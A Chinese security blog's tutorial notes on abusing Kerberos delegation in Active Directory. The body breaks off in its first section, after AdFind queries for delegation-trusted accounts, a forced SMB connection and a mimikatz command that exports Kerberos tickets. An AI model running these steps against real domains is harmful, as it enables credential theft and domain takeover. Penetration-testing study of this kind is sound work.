<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon-package/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon-package/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon-package/favicon-16x16.png">
  <link rel="mask-icon" href="/assets/images/favicon-package/safari-pinned-tab.svg" color="#222">
  <link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">
  <meta name="google-site-verification" content="qIz-Tg08U6gyN_53z89yii0ZmKx2avfsO-iyOWhsRx8">
  <meta name="msvalidate.01" content="096F3D01D2AA04148F10750CD4566535">
  <meta name="yandex-verification" content="43f790b7e38394a4">
  <meta name="baidu-site-verification" content="codeva-LMZoUaXjJl">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="/lib/animate.css/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"loli.fj.cn","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-light","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"manual"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="前言委派漏洞利用">
<meta property="og:type" content="article">
<meta property="og:title" content="【笔记】委派漏洞利用">
<meta property="og:url" content="https://loli.fj.cn/2024/11/20/%E5%A7%94%E6%B4%BE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="57uv6Z6g55qE5Y2a5a6i">
<meta property="og:description" content="前言委派漏洞利用">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-11-20T05:52:55.000Z">
<meta property="article:modified_time" content="2025-10-25T07:39:44.954Z">
<meta property="article:author" content="57uv6Z6g">
<meta property="article:tag" content="Windows">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://loli.fj.cn/2024/11/20/%E5%A7%94%E6%B4%BE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://loli.fj.cn/2024/11/20/%E5%A7%94%E6%B4%BE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","path":"2024/11/20/委派漏洞利用/","title":"【笔记】委派漏洞利用"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>【笔记】委派漏洞利用 | 57uv6Z6g55qE5Y2a5a6i</title>
  






  <script async defer data-website-id="981ed5a0-eea5-4426-a8a9-c16a789ccc3f" src="https://umami.loli.fj.cn/script.js" data-host-url="https://umami.loli.fj.cn/"></script>


  
  <script src="/lib/animejs/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="/lib/@next-theme/pjax/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
  <script src="/lib/medium-zoom/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous" defer></script>
  <script src="/lib/pangu/dist/browser/pangu.umd.js" integrity="sha256-erngBMP3zzoIM6eqQ8dmrReh2vqCRgWmORroIfVoDlE=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>

  <script src="/lib/hexo-generator-searchdb/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"/lib/mathjax/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js" defer></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="57uv6Z6g55qE5Y2a5a6i" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">57uv6Z6g55qE5Y2a5a6i</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">MS4wLjABAAAA5qMD8Gzdcgq7HXUOviKB59i0-ybJ59jJvNzyaPt5XOsVNqP6DU7WLcoAXvdxvYdp💗<br><font color="red">本站所有文章仅作技术研究，请勿非法破坏，请遵守相关法律法规，后果自负</font></p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-reward"><a href="/reward/" rel="section"><i class="fa fa-hand-holding-heart fa-fw"></i>赞助</a></li><li class="menu-item menu-item-command"><a href="/command/" rel="section"><i class="fa fa-book fa-fw"></i>指令</a></li><li class="menu-item menu-item-contribute"><a href="/contribute/" rel="section"><i class="fa fa-chart-line fa-fw"></i>贡献</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>订阅</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

<link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">2.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">3.</span> <span class="nav-text">非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞利用前提</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc"><span class="nav-number">3.2.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E5%90%91%E6%9C%89%E5%A7%94%E6%B4%BE%E6%9D%83%E9%99%90%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%91%E8%B5%B7smb%E8%AF%B7%E6%B1%82"><span class="nav-number">3.3.</span> <span class="nav-text">受害者向有委派权限的计算机发起smb请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87mimikatz%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE"><span class="nav-number">3.4.</span> <span class="nav-text">通过mimikatz导出凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87mimikatz%E5%AF%BC%E5%85%A5%E5%87%AD%E6%8D%AE"><span class="nav-number">3.5.</span> <span class="nav-text">通过mimikatz导入凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8E%E7%9B%AE%E6%A0%87%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">3.6.</span> <span class="nav-text">与目标建立连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">4.</span> <span class="nav-text">约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-1"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞利用前提</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc-1"><span class="nav-number">4.2.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87kekeo%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE"><span class="nav-number">4.3.</span> <span class="nav-text">通过kekeo获取用户凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87kekeo%E8%8E%B7%E5%8F%96%E7%9A%84%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E5%87%AD%E6%8D%AE"><span class="nav-number">4.4.</span> <span class="nav-text">通过kekeo获取的用户凭据获取域控凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87mimikatz%E5%AF%BC%E5%85%A5%E5%87%AD%E6%8D%AE-1"><span class="nav-number">4.5.</span> <span class="nav-text">通过mimikatz导入凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8E%E7%9B%AE%E6%A0%87%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5-1"><span class="nav-number">4.6.</span> <span class="nav-text">与目标建立连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%EF%BC%88PowerShell%E8%84%9A%E6%9C%AC%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">资源约束委派（PowerShell脚本）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-2"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞利用前提</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc-2"><span class="nav-number">5.2.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%94%A8%E6%88%B7SID%E5%AF%B9%E5%BA%94%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D"><span class="nav-number">5.3.</span> <span class="nav-text">获取域用户SID对应的用户名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7"><span class="nav-number">5.4.</span> <span class="nav-text">添加域计算机账户</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87PowerShell%E8%84%9A%E6%9C%AC"><span class="nav-number">5.4.1.</span> <span class="nav-text">通过PowerShell脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A5%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%B7%BB%E5%8A%A0%E5%9F%9F%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7"><span class="nav-number">5.4.1.1.</span> <span class="nav-text">以普通域用户权限添加域计算机账户</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E9%A1%B9%E7%9B%AE"><span class="nav-number">5.4.1.1.1.</span> <span class="nav-text">下载项目</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%81%E8%AE%B8%E6%89%A7%E8%A1%8CPowerShell%E8%84%9A%E6%9C%AC%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89"><span class="nav-number">5.4.1.1.2.</span> <span class="nav-text">允许执行PowerShell脚本（可选）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BC%95%E5%85%A5%E4%BE%9D%E8%B5%96"><span class="nav-number">5.4.1.1.3.</span> <span class="nav-text">引入依赖</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7-1"><span class="nav-number">5.4.1.1.4.</span> <span class="nav-text">添加域计算机账户</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%96%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E7%9A%84SID%E5%80%BC"><span class="nav-number">5.4.1.2.</span> <span class="nav-text">获取新计算机账户的SID值</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E9%A1%B9%E7%9B%AE-1"><span class="nav-number">5.4.1.2.1.</span> <span class="nav-text">下载项目</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%81%E8%AE%B8%E6%89%A7%E8%A1%8CPowerShell%E8%84%9A%E6%9C%AC%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89-1"><span class="nav-number">5.4.1.2.2.</span> <span class="nav-text">允许执行PowerShell脚本（可选）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BC%95%E5%85%A5%E4%BE%9D%E8%B5%96-1"><span class="nav-number">5.4.1.2.3.</span> <span class="nav-text">引入依赖</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%96%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E7%9A%84SID%E5%80%BC-1"><span class="nav-number">5.4.1.2.4.</span> <span class="nav-text">获取新计算机账户的SID值</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E4%B8%8A%E4%B8%80%E6%AD%A5%E9%AA%A4%E6%B7%BB%E5%8A%A0%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E5%B1%9E%E6%80%A7"><span class="nav-number">5.4.1.3.</span> <span class="nav-text">修改上一步骤添加的计算机账户属性</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E9%A1%B9%E7%9B%AE-2"><span class="nav-number">5.4.1.3.1.</span> <span class="nav-text">下载项目</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%81%E8%AE%B8%E6%89%A7%E8%A1%8CPowerShell%E8%84%9A%E6%9C%AC%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89-2"><span class="nav-number">5.4.1.3.2.</span> <span class="nav-text">允许执行PowerShell脚本（可选）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BC%95%E5%85%A5%E4%BE%9D%E8%B5%96-2"><span class="nav-number">5.4.1.3.3.</span> <span class="nav-text">引入依赖</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E4%B8%8A%E4%B8%80%E6%AD%A5%E9%AA%A4%E6%B7%BB%E5%8A%A0%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E5%B1%9E%E6%80%A7-1"><span class="nav-number">5.4.1.3.4.</span> <span class="nav-text">修改上一步骤添加的计算机账户属性</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E4%BF%AE%E6%94%B9%E6%88%90%E5%8A%9F%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89"><span class="nav-number">5.4.1.3.5.</span> <span class="nav-text">验证是否修改成功（可选）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E4%BF%AE%E6%94%B9%E7%9A%84%E5%B1%9E%E6%80%A7%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89"><span class="nav-number">5.4.1.3.6.</span> <span class="nav-text">清除修改的属性（可选）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87HPVCA-SharpAllowedToAct"><span class="nav-number">5.4.2.</span> <span class="nav-text">通过HPVCA&#x2F;SharpAllowedToAct</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A5%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%B7%BB%E5%8A%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7"><span class="nav-number">5.4.2.1.</span> <span class="nav-text">以普通用户权限添加计算机账户</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E9%A1%B9%E7%9B%AE-3"><span class="nav-number">5.4.2.1.1.</span> <span class="nav-text">下载项目</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BC%96%E8%AF%91DotNet%E9%A1%B9%E7%9B%AE"><span class="nav-number">5.4.2.1.2.</span> <span class="nav-text">编译DotNet项目</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A5%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%B7%BB%E5%8A%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7-1"><span class="nav-number">5.4.2.1.3.</span> <span class="nav-text">以普通用户权限添加计算机账户</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87Impacket%E7%94%9F%E6%88%90%E5%87%AD%E6%8D%AE"><span class="nav-number">5.5.</span> <span class="nav-text">通过Impacket生成凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87mimikatz%E5%AF%BC%E5%85%A5%E5%87%AD%E6%8D%AE-2"><span class="nav-number">5.6.</span> <span class="nav-text">通过mimikatz导入凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">5.7.</span> <span class="nav-text">建立连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%88%90"><span class="nav-number">6.</span> <span class="nav-text">完成</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="57uv6Z6g"
      src="/assets/images/avatar.gif">
  <p class="site-author-name" itemprop="name">57uv6Z6g</p>
  <div class="site-description" itemprop="description">5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="mailto:00-isomer-cabbies@icloud.com" title="E-Mail → mailto:00-isomer-cabbies@icloud.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://t.me/LittleSweetCookie" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;LittleSweetCookie" rel="noopener me" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
      </span>
  </div>

<div id="aplayer-app"></div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://loli.fj.cn/2024/11/20/%E5%A7%94%E6%B4%BE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/assets/images/avatar.gif">
      <meta itemprop="name" content="57uv6Z6g">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="57uv6Z6g55qE5Y2a5a6i">
      <meta itemprop="description" content="5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="【笔记】委派漏洞利用 | 57uv6Z6g55qE5Y2a5a6i">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【笔记】委派漏洞利用
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-20 13:52:55" itemprop="dateCreated datePublished" datetime="2024-11-20T13:52:55+08:00">2024-11-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-25 15:39:44" itemprop="dateModified" datetime="2025-10-25T15:39:44+08:00">2025-10-25</time>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>委派漏洞利用</p>
<span id="more"></span>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li><a href="/302.html?target=https://www.joeware.net/freetools/tools/adfind/">AdFind.exe</a></li>
</ul>
<h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h3 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h3><ul>
<li><p>域控指定有委派权限的计算机</p>
<ul>
<li>域控的<code>服务管理器</code>-&gt;<code>Computers</code>-&gt;受害者计算机<code>委派</code>被设置为<code>信任此计算机来委派任何服务</code></li>
</ul>
</li>
<li><p>域控指定有委派权限的用户</p>
</li>
</ul>
<blockquote>
<p><code>&lt;username&gt;</code>：委派的用户</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A priv/test &lt;username&gt;</span><br></pre></td></tr></table></figure>

<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><ul>
<li>查询域内设置了非约束委派的用户账户</li>
</ul>
<blockquote>
<p><code>&quot;DC=example,DC=com&quot;</code>：指定域名前缀和后缀</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -b &quot;DC=example,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306368</span>)(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; dn</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dn:CN=&lt;username&gt;,CN=Users,DC=example,DC=com</span><br></pre></td></tr></table></figure>

<ul>
<li>查询域内设置了非约束委派的计算机账户</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\AdFind.exe -b &quot;DC=example,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306369</span>)(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; dn</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dn:CN=&lt;computername&gt;,CN=Computers,DC=example,DC=com</span><br></pre></td></tr></table></figure>

<h3 id="受害者向有委派权限的计算机发起smb请求"><a href="#受害者向有委派权限的计算机发起smb请求" class="headerlink" title="受害者向有委派权限的计算机发起smb请求"></a>受害者向有委派权限的计算机发起smb请求</h3><blockquote>
<p><code>&lt;ip&gt;</code>：有委派权限的计算机IP地址</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt;\ipc$</span><br></pre></td></tr></table></figure>

<h3 id="通过mimikatz导出凭据"><a href="#通过mimikatz导出凭据" class="headerlink" title="通过mimikatz导出凭据"></a>通过mimikatz导出凭据</h3><ul>
<li><a href="/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE">传送门</a></li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<h3 id="通过mimikatz导入凭据"><a href="#通过mimikatz导入凭据" class="headerlink" title="通过mimikatz导入凭据"></a>通过mimikatz导入凭据</h3><ul>
